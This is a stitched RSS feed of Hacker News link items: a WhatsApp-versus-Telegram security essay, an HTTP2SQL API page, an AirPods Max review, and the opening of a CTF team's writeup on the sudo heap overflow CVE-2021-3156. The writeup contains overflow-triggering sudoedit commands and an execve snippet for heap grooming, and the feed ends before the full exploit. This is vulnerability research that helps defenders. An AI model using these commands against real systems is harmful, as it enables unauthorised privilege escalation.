<li><a href="#secure-backups">Secure backups</a></li>
<li><a href="#auth">Authentication</a></li>
<li><a href="#sync">Device synchronization</a></li>
</ol></li>
<li><a href="#telegram">Criticism of Telegram</a><ol>
<li><a href="#default-e2ee">No end-to-end encryption by default</a></li>
<li><a href="#rolled-their-own">They rolled their own crypto</a></li>
<li><a href="#vulns">History of Telegram vulnerabilities</a></li>
<li><a href="#defamation">Defamation</a></li>
</ol></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
</section>
<h2 id="prologue">Prologue</h2>
<p>Most sources which praise WhatsApp and criticize Telegram make bold claims,
presenting them as objective truth, without
sufficiently motivating them or backing them up with facts. In many cases they
rely on <a href="https://en.wikipedia.org/wiki/Argument_from_authority" target="_blank" rel="nofollow noopener noreferrer">arguments from authority</a>:</p>
<blockquote>
<p>[Telegram] By default, it is less safe than @WhatsApp, which makes [it] dangerous
for non-experts. — <a href="https://twitter.com/Snowden/status/778597417797226496" target="_blank" rel="nofollow noopener noreferrer">Ed. Snowden (Sep, 2016)</a></p>
</blockquote>
<p>I realize that many of you will be sceptical now. After all, if Edward Snowden
said so, it <em>must</em> be true. Why would you question it? And why, above all, should we <em>believe</em> you instead?</p>
<p>Well, the point is exactly this. I am not asking you to believe <em>me</em>, but to
evaluate the facts, with an open mind, before forming an opinion.
Moreover, even if it might be hard to accept, even heroes and geniuses like Edward
Snowden can be wrong from time to time!</p>
<p>I made a good faith attempt to research all the facts and present them as
objectively as possible, without including personal biases. However, please
keep in mind that I do not consider myself infallible, and thus there might be
some mistakes. Feel free to let me know what you think.</p>




<h2 id="fallacies">The fallacies</h2>
<p>The vast majority of things I read on this topic can be reduced to a combination
of the following factors:</p>

<ol>
<li>Not considering a <a href="https://en.wikipedia.org/wiki/Threat_model" target="_blank" rel="nofollow noopener noreferrer">threat model</a>.</li>
<li>The <a href="https://en.wikipedia.org/wiki/False_premise" target="_blank" rel="nofollow noopener noreferrer">false premise</a> that end-to-end encryption alone is a necessary and
sufficient condition for good security and privacy.</li>
<li>The erroneous conclusion that everything that is not end-to-end encrypted is
inherently less secure and must be avoided at all cost.</li>
<li>The huge respect for <a href="https://en.wikipedia.org/wiki/Moxie_Marlinspike" target="_blank" rel="nofollow noopener noreferrer">Moxie Marlinspike</a>, one of the authors of the
<a href="https://en.wikipedia.org/wiki/Signal_Protocol" target="_blank" rel="nofollow noopener noreferrer">end-to-end encryption protocol</a> used by WhatsApp and
Signal, leading to <a href="https://en.wikipedia.org/wiki/Argument_from_authority" target="_blank" rel="nofollow noopener noreferrer">arguments from authority</a>.</li>
<li>Outright lies about the insecurity of the cryptographic protocol used by
Telegram.</li>
</ol>
<p>The rest of the article is dedicated to amply clarify each of the points
above. In <a href="#threat-models">section 3</a> I will articulate the importance of considering threat
models when trying to determine if a system is <em>secure</em>. In <a href="">section 4</a>
I will discuss end-to-end encryption, the challenges that it entails and how it
is implemented in WhatsApp and Telegram. In <a href="#telegram">section 5</a> I will address the most
common criticisms of Telegram, and finally, in <a href="#conclusion">section 6</a>, I will draw some conclusions.</p>


<h2 id="threat-modeling">Threat modeling</h2>
<blockquote>
<p>Threat modeling answers questions like “Where am I most vulnerable to attack?”, “What are the most relevant threats?”, and “What do I need to do to safeguard against these threats?”. — <a href="https://en.wikipedia.org/wiki/Threat_model" target="_blank" rel="nofollow noopener noreferrer">Wikipedia</a></p>
</blockquote>
<p>Searching on Hacker News for <a href="https://hn.algolia.com/?dateRange=all&amp;page=0&amp;prefix=false&amp;query=%22whatsapp%20is%20more%20secure%22&amp;sort=byPopularity&amp;type=all" target="_blank" rel="nofollow noopener noreferrer">“WhatsApp is more secure”</a>
yields some typical comments from people arguing that WhatsApp is more secure
than Telegram</p>
<blockquote>
<p>Telegram is more fun (bots and stickers), but <strong>WhatsApp is more secure</strong>
(no messages on server, no rolled-your-own-crypto). — <a href="https://news.ycombinator.com/item?id=14374644" target="_blank" rel="nofollow noopener noreferrer">hn</a></p>
</blockquote>
<p>Or even that Telegram is the least secure</p>
<blockquote>
<p>How can anyone call “Telegram” secure? Those days are over. It’s the least
secure messaging app of them all now. <strong>Even WhatsApp is more secure than
Telegram</strong> (let alone Threema). — <a href="https://news.ycombinator.com/item?id=13032192" target="_blank" rel="nofollow noopener noreferrer">hn</a></p>
</blockquote>
<p>But, what does it really mean that WhatsApp is <em>more secure</em>? Secure against the
government? Secure against your friendly neighbourhood hacker snooping on
the Wi-Fi at Starbucks?
Secure against throwing rocks at your phone? Secure against your mom trying to
read your messages?</p>
<p>Defending from an adversary with practically unlimited budget and computational
resources, such as a powerful government, is going to be much harder than
defending against a curious neighbour sniffing on your Wi-Fi.</p>
<p><strong>Saying that WhatsApp is more secure than Telegram,
without specifying against what kind of adversary or against what kind of threat,
does not mean much.</strong></p>

<p>Without considering these questions and only craving for <em>“more security”</em>, <strong>is
not necessarily a smart thing</strong> either.
In the same way that putting your possessions in a nuclear bunker
might be more secure, in
case of a nuclear war, than locking them in a small safe in your room, but could
not be the best choice if all you are trying to do is protect your Blu-ray
collection from your flatmate!
Moreover, <strong>increasing security is often not free</strong>, because
it increases complexity, thus development cost, and can decrease usability. Exactly like a nuclear bunker
is going to be much more expensive than a small safe and is also not going to be
as easy to use.
Lastly, it is important to note that <strong>you are as secure as the weakest link in your system</strong>.
Therefore, if you want a nuclear bunker, with all the challenges and costs that
it entails, but then forget to put a lock on its door, it might not protect you that
much after all.</p>


<p>Consequently, let us now try to examine which of the <em>components</em> involved in
using a messaging app can be potentially attacked by a malicious agent,
compromising our security.
For each of these, <em>you</em> need to establish if you blindly trust it to function
correctly, or if you believe it could be compromised and thus need to find a way
to defend it from the potential threat.</p>

<ul>
<li><strong>The companies running the servers needed by the app to work</strong>. That is,
Facebook, Telegram and whatever other third party services they decide to
use or share your data with.<ol>
<li>Are you OK with them being able to read your messages?</li>
<li>Do you trust them on keeping your data safe? So that it does not get
stolen, for example.</li>
<li>Are you OK with them selling your data or meta-data to advertisers?</li>
</ol></li>
<li><strong>The app itself</strong>. That is, the WhatsApp or Telegram apps on your
phone.<ol>
<li>Do you trust that it does exactly what it says and is not malicious? For
example that it is always encrypting your messages.</li>
<li>Do you trust its developers to be good citizens and not insert backdoors?</li>
</ol></li>
<li><strong>The communication medium</strong>. That is, the Internet.<ol>
<li>Do you trust the connection between you and the app’s servers to be
secure?</li>
<li>Do you trust your ISP?</li>
</ol></li>
<li><strong>The distribution and update process</strong>. For example, the Play Store, App
Store or F-Droid. Do you trust Google and Apple to give you the real app,
and not a specially crafted one to spy on you?</li>
<li><strong>The other apps on your phone</strong>. Do you trust all the other apps on your
phone, or do you think some of them might be malware?</li>
<li><strong>The OS</strong>. That is, Android or iOS. Do you trust your
operative system and its developers (e.g. Google, Samsung, Apple)? For example,
do you trust that no malicious actor can remotely <a href="https://www.tripwire.com/state-of-security/latest-security-news/gaps-in-google-play-store-xfo-allow-attackers-to-remotely-install-malware-on-android-devices/" target="_blank" rel="nofollow noopener noreferrer">install</a>
or <a href="https://android-developers.googleblog.com/2010/06/exercising-our-remote-application.html" target="_blank" rel="nofollow noopener noreferrer">uninstall</a> software on your device?</li>
<li><strong>The firmware and the hardware</strong>. Do you trust your phone is not running
malware at the firmware or hardware level,
<a href="https://redmine.replicant.us/projects/replicant/wiki/SamsungGalaxyBackdoor" target="_blank" rel="nofollow noopener noreferrer">like it was discovered on Samsung phones in 2014</a>?</li>
</ul>
<p>Whew, that was quite a list!</p>
<p>But, <strong>do we really need to care about all of this stuff?</strong> Well, not many
people do.
However, if you want to evaluate which messaging app best suits your needs and
you care a bit about security and privacy, then it is essential.
This process will enable you to decide for yourself, without basing your decision
on some tweet saying that one app is <em>more secure</em> than the other.</p>

<p>Nonetheless, it is important to reiterate that if you are worried that a powerful
adversary, like a government, might want to directly target you (as opposed to
compromise you as part of a mass surveillance program), you cannot defend only
against one attack vector and ignore the others.
You can have the most secure messaging app in the world, but if your phone can be hacked
with an SMS, there is not much of a difference.</p>


<p>You might wonder why couldn’t we just try to defend ourselves against all possible
threats and attacks. It is because, as we said before and as we will show in more
detail in the next section, increasing security is not free but comes
with the cost of increased complexity and very often decreased usability.</p>

<h2 id="e2ee">End-to-end encryption</h2>
<p>Let us now address the most common reason that induces people to believe that
WhatsApp is a better choice: <a href="https://en.wikipedia.org/wiki/End-to-end_encryption" target="_blank" rel="nofollow noopener noreferrer">end-to-end encryption</a>.</p>

<p>WhatsApp describes end-to-end encryption (or E2EE for short) in the following way:</p>
<blockquote>
<p>End-to-end encryption ensures only you and the person you’re communicating
with can read or listen to what is sent, and nobody in between, not even
WhatsApp. This is because with end-to-end encryption, your messages are
secured with a lock, and only the recipient and you have the special key
needed to unlock and read them. All of this happens automatically: no need to
turn on any special settings to secure your messages. — <a href="https://faq.whatsapp.com/general/security-and-privacy/end-to-end-encryption/?lang=en" target="_blank" rel="nofollow noopener noreferrer">WhatsApp FAQ</a></p>
</blockquote>
<p>WhatsApp nowadays has end-to-end encryption enabled by default for all chats,
while Telegram has not enabled it by default and does not support it on group
chats.</p>
<p>This is undoubtedly a very nice property to have. If implemented correctly it
allows us to communicate securely, even in the case in which the server (i.e.
WhatsApp or Telegram) cannot be trusted and is considered malicious.
However, if we decide to go down this road and not trust any more the companies
running our app, we introduce a series of new complications.</p>
<p>However, one could argue that even in the case in which we decide to trust the
Service, it is beneficial to have end-to-end encryption. This is a valid point because, while
we might trust the Service, for sure we do not trust some potential malicious
actors compromising the Service’s infrastructure and getting access to our data. In
this scenario our data should still be safe because not even the Service has
access to it, and therefore an attacker cannot steal the decryption key nor
coerce the Service to disclose it. This is the major strength of
E2EE.
Nonetheless, it is worth to stress that in this scenario we assumed to trust
the …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://germano.dev/whatsapp-vs-telegram/">https://germano.dev/whatsapp-vs-telegram/</a></em></p>]]>
            </description>
            <link>https://germano.dev/whatsapp-vs-telegram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26001191</guid>
            <pubDate>Tue, 02 Feb 2021 14:19:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: HTTP2SQL – Query any SQL database directly from an HTTP request]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26000928">thread link</a>) | @cosbgn
<br/>
February 2, 2021 | https://zero.sh/labs/http2sql | <a href="https://web.archive.org/web/*/https://zero.sh/labs/http2sql">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Http2SQL is a free api which will allow you to query any SQL database from an HTTP request.
It uses <a href="https://sequelize.org/" rel="nofollow noopener noreferrer" target="_blank">Sequelize</a> to handle the connection</p>
<p>It's free to use and doesn't require an API key or authentication. The code is available on <a href="https://github.com/Cosbgn/zero-labs/blob/master/api/http2sql.js" rel="nofollow noopener noreferrer" target="_blank">Github</a></p>
<p>With Zero you can build great interactive dashboards pulling data directly from your SQL database! It's free!
Give it a try at <a href="https://zero.sh/play" rel="nofollow noopener noreferrer" target="_blank">https://zero.sh/play</a></p>
<h2 id="1-make-sure-that-your-request-is-private-and-from-a-secure-connection">1. Make sure that your request is private and from a secure connection</h2>
<p>This API requires that you pass the entire database connection URI. This contains your username and password so never use this API directly from your frontend or from somewhere where users can access it.</p>
<p>If you use it on Zero.sh save your connection string on a <code>secret</code> and use that.</p>
<h2 id="2-format-your-request">2. Format your request</h2>
<p>This API accepts only <strong>POST</strong> requests to this endpoint: <code>https://labs.zero.sh/api/http2sql</code></p>
<p>The following data is allowed:</p>
<ul>
<li><strong>uri</strong>:
You database connection uri, e.g. <code>postgres:// ...</code>.</li>
<li><strong>query</strong>:
Your SQL query, e.g. <code>Select * from "Users"</code></li>
<li><strong>config_object</strong>:
If you don't want to pass the URI you can alternatively pass a <a href="https://sequelize.org/master/manual/getting-started.html" rel="nofollow noopener noreferrer" target="_blank">Sequelize connection object</a> - e.g. <code>{dialect: 'mysql', etc}</code></li>
</ul>
<p>You always need to pass a <code>query</code> and either the <code>uri</code> or the <code>config_object</code></p>
<h2 id="3-your-response">3. Your response</h2>
<p>The tool will either return and error or, in case of success the sequelize response. (Note: This can be null, for example <code>INSERT INTO</code> statements)</p>
<h2 id="4-an-example">4. An example:</h2>
<p>This is how you would create a table of users on Zero:</p>
<div><pre><code>

<span>const</span> post_data <span>=</span> <span>{</span>
  uri<span>:</span>secrets<span>.</span><span>db_uri</span><span>,</span> 
  query<span>:</span> <span><span>`</span><span>Select * from "Users"</span><span>`</span></span>
<span>}</span>
<span>const</span> <span>{</span>data<span>}</span> <span>=</span> <span>await</span> api<span>.</span><span>post</span><span>(</span><span>"https://labs.zero.sh/api/http2sql"</span><span>,</span> post_data<span>)</span>

<span>return</span> data
</code></pre></div>
<h2 id="questions">Questions?</h2>
<p>Feel free to send us an email at <a href="mailto:support@zero.sh">support@zero.sh</a> or open an issue on <a href="https://github.com/Cosbgn/zero-labs" rel="nofollow noopener noreferrer" target="_blank">Github</a></p></div></div></div>]]>
            </description>
            <link>https://zero.sh/labs/http2sql</link>
            <guid isPermaLink="false">hacker-news-small-sites-26000928</guid>
            <pubDate>Tue, 02 Feb 2021 13:52:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AirPods Max: An Audiophile Review]]>
            </title>
            <description>
<![CDATA[
Score 299 | Comments 358 (<a href="https://news.ycombinator.com/item?id=26000698">thread link</a>) | @drclau
<br/>
February 2, 2021 | https://mariusmasalar.me/airpods-max | <a href="https://web.archive.org/web/*/https://mariusmasalar.me/airpods-max">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>
          <p><a href="https://mariusmasalar.me/airpods-max">December 18, 2020</a></p>

		 <h4>Surprising sound let down by serious comfort problems</h4>

		 
<p><img src="https://marius.imgix.net/AirPodsMax-1.jpg?auto=compress&amp;q=75&amp;fit=clip&amp;w=1500&amp;s=6b8a0daf46384709fee2520ad544cdff"></p>
<p>I’m conflicted about Apple’s latest foray into audio products, the AirPods Max over-ear headphones.</p>
<p>In striking opposition to every other review I’ve seen so far, I get to begin mine by stating that I <em>am</em> an audiophile. A friendly, reasonable one, but still—<a href="https://mariusmasalar.me/plague-inc-the-cure">audio is my jam</a>. I’ve been writing music for games and film for over 10 years, so one would hope that I’ve learned a thing or two about audio production in that time. It is, therefore, my sworn duty to be skeptical of consumer technology companies encroaching on the territory of high-end audio equipment built by companies with decades of experience.</p>

<p>Apple has had a long and fruitful relationship with music, but their track record with audio hardware is inconsistent. Somehow, the company that makes the HomePod—a marvel of mono speaker engineering—is also the company that continues to make and sell Beats products. Beats are a common entry point into the world of audio, but they’re priced the way they are because of their brand power, not because their quality justifies it. You can get much better sound, comfort, features, and build for less money.</p>
<p>Today, I find myself wondering to what extent that is also true for the AirPods Max.</p>
<p>Having forked over just under $900 <span>CAD</span> for the privilege of owning a pair, I wanted to see whether Apple is aiming to establish itself as a purveyor of quality audio gear—deserving of a high price tag—or whether we’ll once again be paying for style over substance.</p>
<p><img src="https://marius.imgix.net/AirPodsMax-5.jpg?auto=compress&amp;q=75&amp;fit=clip&amp;w=1500&amp;s=3b6c49e79651f9f936486a7886ff54db"></p>

<p>I laughed when I pulled the AirPods Max out of their box. I knew they would be heavy, but the experience of that weight is really something else.</p>
<p>For context, the Sennheiser <span>PXC</span> 550—my current headphone choice for travel—weigh 227g. The famously comfortable Bose 700 weigh 254g, a weight that’s matched by the popular Sony WH-1000XM4. Premium pairs like the Bang &amp; Olufsen <span>H9</span> (third generation) weigh 295g, and the Bowers &amp; Wilkins <span>PX7</span> just barely crest the 300g mark.</p>
<p>The AirPods Max weigh <em>385g</em>.</p>
<p>In the same way that the iPhone 12’s aluminum build <em>looks</em> less fancy but <em>feels</em> nicer in use than its Pro counterparts and their stainless steel, the mostly-metal build of the AirPods Max is a choice that favours fashion over comfort.</p>
<p>The reason that other high-end headphone manufacturers lean heavily on plastic and even wood in their builds isn’t that they can’t afford metal. It’s because they’re interested in having human beings wear these products on their heads for hours at a time.</p>
<p>As one such human being with a head, I wish Apple had taken some cues from the competition on this front. Even after adjusting the way I wear them, I can’t escape the fact that these are just plain <em>uncomfortable</em> for long listening sessions. The mesh headband and foam ear cups do their best to mitigate this, but they can’t compensate for the sheer weight.</p>
<p>The headband is terrific. It may be my favourite approach to one that I’ve seen on a headphone. I have to wear the band further back on my head than I do with other headphones, but once I figured that out I was able to wear them for longer before needing a break. The ear cups are less impressive. They’re spacious and fairly well padded, but the material that’s used feels somewhat cheap and scratchy in texture. I suspect it’s more breathable than typical leather or vinyl ear cups, but the physical impression isn’t as good and I don’t particularly like how they feel on my face.</p>
<p>Then there’s the clamping force, which is <em>very</em> strong; AirPods Max squeeze your head like a musical bear hug. This is a common problem with heavy headphones, so I wasn’t surprised to see it here, but it accounts for the majority of the comfort problems I have.</p>
<p>The pressure points will differ depending on your fit, but I offered these to two other people in my vicinity for some extended listening and both reported discomfort; one on the top of their head, the other around their ears where the clamp force put pressure on the jaw. Personally, I experience it mainly as a headache after about the half hour to one hour mark.</p>
<p>Let’s disregard weight for a moment, though. These are fine for shorter listening sessions and everyone’s head is different, so I’m sure there are folks out there who will find them to be perfectly comfortable. The problems with metal go beyond weight: by prioritizing fashion value over practical value, Apple has committed a series of unforced errors.</p>
<p>Anodized aluminum feels nice and soft, but that softness means they scuff easily…like, say, when you fold them flat and notice that the ear cups bump and scratch against each other. This happens all the time and it makes me cringe every time; it’s like the horrible scraping that iMac users will be familiar with from trying to plug something into the rear ports. Also, parts of the world experience a season called winter, where the temperature drops and metal surfaces become dangerous things your skin will stick to.</p>
<p>Now, about that<span></span> <span>“</span>protective case”.</p>
<p><img src="https://marius.imgix.net/AirPodsMax-8.jpg?auto=compress&amp;q=75&amp;fit=clip&amp;w=1500&amp;s=392ed93e8e6a65298b215cf68f228603"></p>
<p>I want to save myself some typing and point you to <a href="https://youtu.be/Gvvo6vUpJRc?t=639" target="_blank">the part of <span>MKBHD</span><span></span><span>’</span>s review video</a> where he talks about the storage solution that these $900 headphones ship with. Go ahead and give that a watch. Back? Great. What he said. Before getting these, I thought the hate for the case was hyperbolic, but the truth is it really <em>does</em> feel cheap and pointless, particularly after <a href="https://support.apple.com/en-us/HT211886" target="_blank">Apple clarified</a> that it isn’t necessary for putting the headphones into standby mode.</p>
<p>Before we leave the topic of their physical design, I want to share one last complaint about the AirPods Max: the buttons. I don’t mind the feel of them myself (though a friend felt they were cheap and unpleasant), but I <em>do</em> mind the way they work. The Digital Crown, which controls volume, is also the button that controls playback and Siri. The other, larger button is used to switch between the listening modes: Active Noise Cancellation (<span>ANC</span>), Transparency mode, and none.</p>
<p>I appreciate having physical controls for these things, but I intuitively expected that all the audio-related functions would be accessed from one button and that the playback and feature controls would be accessed from the other. Tying playback controls to the volume knob feels strange to me, and increases the chances of unintentional volume changes when you’re trying to execute a double or triple press—something made even trickier if you’re wearing gloves.</p>
<p>There is, naturally, no way to configure these button assignments. At best, you’re able to change the scrolling direction of the volume knob and restrict which listening modes the other button switches between, but that’s about it. That latter feature also seems to be buggy in the current firmware (<span>3C16</span>) because despite enabling all three, I find that it defaults back to just Noise Cancellation or Transparency whenever I reconnect.</p>
<p>Deal-breaker? No.&nbsp;But another strange design choice to wrap up this section.</p>
<p><img src="https://marius.imgix.net/AirPodsMax-7.jpg?auto=compress&amp;q=75&amp;fit=clip&amp;w=1500&amp;s=f6b19d4c7ef961a06df1a759fc2f45b5"></p>
<p>Wait, one more complaint: the battery life is the shortest of any headphone in this category. This isn’t an issue in and of itself considering they’ll still last through a full day of listening. Still, I hoped that some of that excess size and weight would translate into battery capacity.</p>
<p>On the topic of power, Apple has indicated that the AirPods Max have two low-power states and you <em>don’t</em> need the case to access them—great news since I refuse to use that stupid thing. Here’s <a href="https://support.apple.com/en-us/HT211886" target="_blank">what they say</a>:</p>
<blockquote>
<p>If you set your AirPods Max down and leave them stationary for 5 minutes, they go into a low power mode to preserve battery charge. After 72 stationary hours out of the Smart Case, your AirPods Max go into a lower power mode that turns off Bluetooth and Find My to preserve battery charge further. If you put your AirPods Max in the Smart Case when you’re not using them, they go into a low power mode immediately to preserve battery charge. After 18 hours in the Smart Case, your AirPods Max go into an ultralow power mode that turns off Bluetooth and Find My and maximizes battery life.</p>
</blockquote>
<p>Okay, <em>now</em> I’m done talking about the physical characteristics.</p>
<h2 id="sonic-boom">Sonic Boom</h2>
<p>So there I was, shaking my head at the weight and the design while I got them connected. I was already looking up Apple’s holiday return policy when I hit play on my usual suite of test material and…oh.</p>
<p><em>Oh</em>.</p>
<p><img src="https://marius.imgix.net/AirPodsMax-4.jpg?auto=compress&amp;q=75&amp;fit=clip&amp;w=1500&amp;s=a34de6bb9c7c71b5c5ccbfad05e1c8f6"></p>
<p>I was reminded of <a href="http://toolsandtoys.net/reviews/the-bowers-wilkins-p7-wireless-headphones-review/" target="_blank">the first time</a> a pair of wireless headphones impressed me. I put them on and somehow found myself lying on the floor of my room, two hours later, having become completely lost in the music. Since then, <a href="https://mariusmasalar.me/bang-olufsen-h9i">other headphones</a> have achieved this magical time-dilation effect, but I didn’t expect to feel it coming from an Apple product.</p>
<p>Don’t get me wrong, Apple has amazing audio engineers. <a href="https://mariusmasalar.me/airpods-pro">I adore my AirPods Pro</a>. They’re not the best value for money in terms of sound, but they have a pleasant, relatively neutral profile and have become my daily listening companions. Similarly, the HomePod is my favourite smart speaker for sound because it manages to provide a remarkably full and dynamic listening experience for a compact mono sound source.</p>
<p>In a word, the AirPods Max sound <em>sublime</em>.</p>
<p>They have a beautiful way of making you feel immersed and enveloped by the music, with a tremendously wide soundstage, solid instrument placement, and some of the most articulate dynamics I’ve heard from consumer equipment. They remind me of my open-back studio headphone and amp setup (the geeky audiophile equipment) more than other wireless headphones.</p>
<p>Several hours of listening later, I wanted to make sure I wasn’t just experiencing some sort of hallucination caused by the extreme clamping force of these metallic behemoths, so I called up my friend and had him bring over his pair of Bang &amp; Olufsen H9i—<a href="https://thesweetsetup.com/articles/a-roundup-of-the-best-wireless-active-noise-cancelling-headphones/" target="_blank">my previous benchmark</a> for best wireless <span>ANC</span> headphones—to do some critical listening.</p>
<p>We cruised through our respective music libraries, selecting favourite tracks and listening, each of us with one of the pairs on. Then we’d swap <a href="https://atp.fm/409" target="_blank">(as others have pointed …</a></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mariusmasalar.me/airpods-max">https://mariusmasalar.me/airpods-max</a></em></p>]]>
            </description>
            <link>https://mariusmasalar.me/airpods-max</link>
            <guid isPermaLink="false">hacker-news-small-sites-26000698</guid>
            <pubDate>Tue, 02 Feb 2021 13:28:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sudo Exploit Writeup (CVE-2021-3156)]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25999667">thread link</a>) | @NicolaiS
<br/>
February 2, 2021 | https://www.kalmarunionen.dk/writeups/sudo/ | <a href="https://web.archive.org/web/*/https://www.kalmarunionen.dk/writeups/sudo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<div>
  <article>
    

    
  

    
    
    <h2>Overview</h2>
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#vulnerability">Vulnerability</a>
      <ul>
        <li><a href="#properties-of-the-overflow">Properties of the overflow</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#heap-grooming">Heap Grooming</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    <p>Writeup by: <a href="https://twitter.com/alexanderkrog">Zanderdk</a></p>
<h2 id="introduction">Introduction</h2>
<p>On the 2021-01-26 qualy released this <a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">article</a> describing a “new” (actually 10 year old) bug in sudo that allows an attacker to do privilege escalation though a heap buffer overflow.
Unfortunately they did not release exploit/POC so I decided to build one myself and failed. It turned out that Pewz from the CTF team bootplug had the same thought and our combined forces allowed us to successfully exploit this bug on the newest libc 2.32 in an arch environment with sudo version 1.9.4p2.</p>
<h2 id="vulnerability">Vulnerability</h2>
<p>I will only briefly cover the vulnerability here as it’s quite well described in the article.</p>
<p>In an essence an attacker can overflow a heap chunk by inserting a single backslash at the end of any argv or env argument given to sudo, causing the following argument to be written out of bound. Let’s look at a simplified version of one of the code snippets from the article.</p>
<div><pre><code data-lang="C"><span>for</span> (size <span>=</span> <span>0</span>, av <span>=</span> NewArgv <span>+</span> <span>1</span>; <span>*</span>av; av<span>++</span>)
  size <span>+=</span> strlen(<span>*</span>av) <span>+</span> <span>1</span>;
...
<span>if</span> (size <span>==</span> <span>0</span> <span>||</span> (user_args <span>=</span> malloc(size)) <span>==</span> NULL) {
  <span>//do some stuff we don't care about
</span><span></span>}
...
<span>for</span> (to <span>=</span> user_args, av <span>=</span> NewArgv <span>+</span> <span>1</span>; (from <span>=</span> <span>*</span>av); av<span>++</span>) {
  <span>while</span> (<span>*</span>from) {
    <span>if</span> (from[<span>0</span>] <span>==</span> <span>'\\'</span> <span>&amp;&amp;</span> <span>!</span>isspace((<span>unsigned</span> <span>char</span>)from[<span>1</span>]))
      from<span>++</span>;
    <span>*</span>to<span>++</span> <span>=</span> <span>*</span>from<span>++</span>;
    }
    <span>*</span>to<span>++</span> <span>=</span> <span>' '</span>;
}
</code></pre></div><p>As we see in the first for loop we are iterating over each argument and finding the size (plus null terminator) of it using <code>strlen</code>. Now lets say we have the string <code>"AAAA\\"</code> (<code>\\</code> is one char).</p>
<p>The size will be 5 and it will only do an allocation of 5 bytes assuming this is the only argument.</p>
<p>In the next part we have a outer for loop over arguments and an inner loop copying the contents of all the arguments into the single buffer, <code>user_args</code>, essentially concatenating all arguments.</p>
<p>Considering the same string as before, <code>"AAAA\\"</code>, when we hit <code>from[0]=='\\'</code> we go into the if and increment <code>from</code> by <code>from++</code>, incrementing <code>from</code> so it points to the null terminator. After that we continue the loop with the next statement <code>*to++ = *from++;</code> copying the null terminator and again incrementing <code>from</code> to continue copying bytes after the null terminator we continue copying out of bounds.</p>
<p>This happens because it expects that every <code>\\</code> is followed by a meta-character, which the authors came up with a clever way of avoiding, leaving this vulnerable to a overflow. Read the article if you want to know why and how we can end up having a single <code>\\</code> in the args when entering this block.</p>
<p>By using the symbolic link <code>sudoedit</code> to <code>sudo</code> we can make this happen:</p>
<p><img src="https://www.kalmarunionen.dk/images/overflow.png" alt="sudo exploit overflowing"></p>
<h3 id="properties-of-the-overflow">Properties of the overflow</h3>
<p>The authors state 3 important properties about this overflow which make it quite powerful.</p>
<p>First and simplest we control the allocation size of <code>user_args</code> as we chose how many and how long we make the arguments to sudo.</p>
<p>Second we control the contents of the overflowed area.
This we can achieve by using the supplied environment variables. The environment variables is infact stored right after the last argument passed to <code>sudoedit</code> meaning that if we do <code>env -i 'A=BBBB' sudoedit -s 'CCCCCCCCCCCCCCCC'</code> we insert the C’s into the user_args buffer and <code>A=BBBB</code> will follow in the out of bounds area. Be aware that chunk size’s align to sizes of 0x10 so e.g. <code>env -i 'A=BB' sudoedit -s 'CCCCBBBBBBBB'</code> will only fill the buffer.</p>
<p>If you paid close attention to the inner loop in our concatenation block you probably noticed that we can exploit this multiple times. By ending a environment variable with <code>\\</code> we can make another skip to the next environment variable. So why would we like that? Because as the <code>from++</code> increments the pointer to the null terminator on the following <code>to++ = *from++;</code> it will insert that null terminator. This makes us able to insert 0x0 as well without ending the overflow making this overflow extremely powerful.</p>
<p>Example from the authors:</p>
<p><code>env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'</code></p>
<p>This will end up like this in the buffer:</p>
<pre><code>--|--------+--------+--------+--------|--------+--------+--------+--------+--
  |        |        |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|
--|--------+--------+--------+--------|--------+--------+--------+--------+--
              size  &lt;---- user_args buffer ----&gt;  size      fd       bk
</code></pre><p>So we wont go into what forward (fd) or backwards (bk) pointers of a heap chunk mean as we are only exploiting in use memory.
Super short and oversimplified description:</p>
<ul>
<li>the first size is the size of the following chunk. It is equal to 0x10 + argument given to malloc as we also need space for size itself and alignment/previous size.</li>
<li>the next size is the contiguous chunks size.</li>
<li>fd and bk are pointers to the next and previous chunk respectively in this linked list of freed chunks. This only applies to freed chunks. Otherwise this space is available to the caller of malloc.</li>
</ul>
<p>If you want to know more about this topic I strongly encourage you to read the <a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">Azeria’s blog about heap exploitation</a>.</p>
<p>Now an important note to make here about the null terminator insertion I think the original paper lacks is that we can insert multiple contiguous null bytes as well.</p>
<p>First thing to understand is that environment variables don’t have to in the form of <code>SOMETHING=something_more</code>. As everything else these are just char arrays and we can do what we can with them in C. as example:</p>
<div><pre><code data-lang="C"><span>char</span> <span>*</span>args[] <span>=</span> { <span>"/usr/bin/sudoedit"</span>, <span>"-s"</span>, <span>"AAAAAAAA"</span>, NULL };
<span>char</span> <span>*</span>env[] <span>=</span> { <span>"BBBBBBBB"</span>, <span>"</span><span>\\</span><span>"</span>, <span>"</span><span>\\</span><span>"</span>, <span>"CCCCCCCC"</span>, NULL };
execve(<span>"/usr/bin/sudoedit"</span>, argv, env);
</code></pre></div><p>Here we are using execve to execute the process with full control of the environment variables.
